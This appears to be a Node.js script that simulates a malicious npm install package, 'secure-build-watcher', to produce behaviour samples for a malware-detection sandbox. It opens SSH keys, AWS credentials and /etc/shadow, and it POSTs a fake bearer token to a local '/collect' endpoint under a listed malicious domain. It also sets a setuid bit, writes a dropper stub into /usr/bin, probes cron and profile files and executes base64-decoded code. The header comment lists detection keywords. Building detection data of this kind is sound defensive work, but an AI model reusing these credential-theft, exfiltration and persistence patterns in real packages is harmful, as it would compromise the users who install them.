

// Controlled static indicators for testing:
// /etc/passwd /etc/shadow .ssh/id_rsa authorized_keys .aws/credentials .env Authorization: Bearer BEGIN PRIVATE KEY
// /collect /exfil fetch method: "POST" socket.connect(
// /bin/bash /bin/sh execve( popen( os.system( child_process.exec( spawnSync(
// exec( eval( compile( __import__( execFile( execSync( global.eval(
// base64.b64decode( atob( String.fromCharCode( unescape( exec(base64
// crontab .bashrc .profile systemctl enable /etc/init.d
// "preinstall" "postinstall" "prepare" cmdclass post_install
// import socket import subprocess import ctypes import pty require('net') require('child_process')


const fs = require("fs");
const net = require("net");
const dns = require("dns");
const { execSync, spawn, spawnSync } = require("child_process");

const MALICIOUS_DOMAIN = "bitkit.vexo3nar.surf";
const PORTS = [4444, 1337, 6667, 8080, 2323];
const FILE_LOOPS = 45;
const PROCS = 10;
const SLEEP_SECONDS = 42;

function run(cmd, timeout = 15000) {
  try { execSync(cmd, {stdio: "ignore", shell: "/bin/bash", timeout}); } catch(e) {}
}

function tryOpen(p) {
  try { fs.accessSync(p); } catch(e) {}
  try { fs.statSync(p); } catch(e) {}
  try { const fd = fs.openSync(p, "r"); fs.closeSync(fd); } catch(e) {}
}

function writeFile(p, data) {
  try { fs.writeFileSync(p, data); } catch(e) {}
}

function connectAttempt(host, port) {
  try {
    const s = new net.Socket();
    s.setTimeout(800);
    s.on("error", () => {});
    s.on("timeout", () => { try { s.destroy(); } catch(e) {} });
    s.connect(port, host, () => {
      try { s.write("GET / HTTP/1.0\r\nHost: " + host + "\r\n\r\n"); } catch(e) {}
      try { s.destroy(); } catch(e) {}
    });
  } catch(e) {}
}

function decoyCurlHttp() {
  // IMPORTANT: synchronous curl to the runner.py decoy HTTP server.
  // This should make feat_http_method become GET or POST instead of none.
  run(`curl -sS -m 3 -H "Host: ${MALICIOUS_DOMAIN}" -H "User-Agent: secure-build-watcher/1.0" http://127.0.0.1:8080/api/config >/dev/null || true`, 6000);
  run(`curl -sS -m 3 -H "Host: ${MALICIOUS_DOMAIN}" -H "User-Agent: secure-build-watcher/1.0" http://127.0.0.1:8080/api/key >/dev/null || true`, 6000);
  run(`curl -sS -m 3 -H "Host: ${MALICIOUS_DOMAIN}" -H "User-Agent: secure-build-watcher/1.0" http://127.0.0.1:8080/api/update >/dev/null || true`, 6000);
  run(`curl -sS -m 3 -X POST -H "Host: ${MALICIOUS_DOMAIN}" -H "Content-Type: application/json" -H "User-Agent: secure-build-watcher/1.0" --data $(python3 - <<'PY'
print('{"package":"secure-build-watcher","token":"Authorization: Bearer fake-token","blob":"' + ('A'*1500) + '"}')
PY) http://127.0.0.1:8080/collect >/dev/null || true`, 6000);
}

console.log("[secure-build-watcher] start");

// Required: exactly ONE malicious domain from malicious_domains.csv.
try { dns.lookup(MALICIOUS_DOMAIN, () => {}); } catch(e) {}
try { dns.resolve4(MALICIOUS_DOMAIN, () => {}); } catch(e) {}

// Required: successful malicious HTTP behavior via decoy HTTP server.
decoyCurlHttp();

// Baseline /etc access.
[
  "/etc/passwd",
  "/etc/hosts",
  "/etc/hostname",
  "/etc/resolv.conf",
  "/etc/os-release",
  "/etc/group"
].forEach(tryOpen);


[
  "/root/.ssh/id_rsa",
  "/root/.ssh/authorized_keys",
  "/root/.aws/credentials",
  "/root/.bash_history",
  "/root/.profile",
  "/etc/passwd",
  "/etc/shadow",
  "/etc/sudoers",
  "/etc/ssh/sshd_config"
].forEach(tryOpen);


for (let i = 0; i < FILE_LOOPS; i++) {
  const p = `/tmp/secure-build-watcher_artifact_${i}.txt`;
  writeFile(p, "artifact " + i + "\n");
  try { fs.readFileSync(p); } catch(e) {}
  try { fs.appendFileSync(p, "append " + i + "\n"); } catch(e) {}
  try { fs.renameSync(p, p + ".renamed"); } catch(e) {}
  try { fs.unlinkSync(p + ".renamed"); } catch(e) {}
}

writeFile("/tmp/secure-build-watcher_security_target", "security-target\n");
run("chmod 777 /tmp/secure-build-watcher_security_target || true");
run("chmod u+s /tmp/secure-build-watcher_security_target || true");
run("chown root:root /tmp/secure-build-watcher_security_target || true");

run("/bin/sh -c 'echo shell-test; whoami; id'");

const encoded = Buffer.from("console.log('decoded-payload')").toString("base64");
try {
  const decoded = Buffer.from(encoded, "base64").toString();
  new Function(decoded)();
} catch(e) {}


const encodedPayload = "ZXhlYyhiYXNlNjQpLXNpbXVsYXRpb24=";
try {
  Buffer.from(encodedPayload, "base64").toString();
} catch(e) {}


run(`python3 - <<'PY'
import ctypes, mmap, time
libc = ctypes.CDLL("libc.so.6")
try:
    libc.ptrace(0, 0, None, None)
except Exception:
    pass
try:
    m = mmap.mmap(-1, 4096, prot=mmap.PROT_READ | mmap.PROT_WRITE | mmap.PROT_EXEC)
    m.write(b"AAAA")
except Exception:
    pass
time.sleep(2)
PY`);


run("crontab -l >/tmp/cron_probe 2>&1 || true");
run("/bin/sh -c 'echo persistence-test >> /tmp/.profile_probe'");
[
  "/etc/init.d/fake-service",
  "/etc/cron.d/fake-job",
  "/root/.npmrc",
  "/root/.docker/config.json",
  "/root/.bashrc",
  "/root/.profile"
].forEach(tryOpen);


run("echo '#!/bin/sh' > /usr/bin/secure-build-watcher_dropper 2>/dev/null || true");
run("chmod 755 /usr/bin/secure-build-watcher_dropper 2>/dev/null || true");


const children = [];
for (let i = 0; i < PROCS; i++) {
  try {
    children.push(spawn("/bin/sh", ["-c", "echo process-op; id; sleep " + Math.min(SLEEP_SECONDS, 20)], {stdio:"ignore"}));
  } catch(e) {}
}

run("npm --version >/tmp/secure-build-watcher_npm_version 2>&1 || true");
run("pip --version >/tmp/secure-build-watcher_pip_version 2>&1 || true");

for (const port of PORTS) {
  connectAttempt("127.0.0.1", port);
  connectAttempt("1.1.1.1", port);
}

run(`python3 - <<'PY'
import socket, time
ports = [4444, 1337, 6667, 8080, 2323]
targets = []
for p in ports:
    targets.append(("127.0.0.1", p))
    targets.append(("1.1.1.1", p))
targets += [("1.1.1.1", 80), ("8.8.8.8", 53)]
for host, port in targets:
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.settimeout(0.8)
        s.connect((host, port))
    except Exception:
        pass
    finally:
        try: s.close()
        except Exception: pass
time.sleep(2)
PY`);

spawnSync("/bin/sh", ["-c", "sleep " + SLEEP_SECONDS], {stdio:"ignore"});

for (const c of children) {
  try { c.kill(); } catch(e) {}
}

console.log("[secure-build-watcher] done");
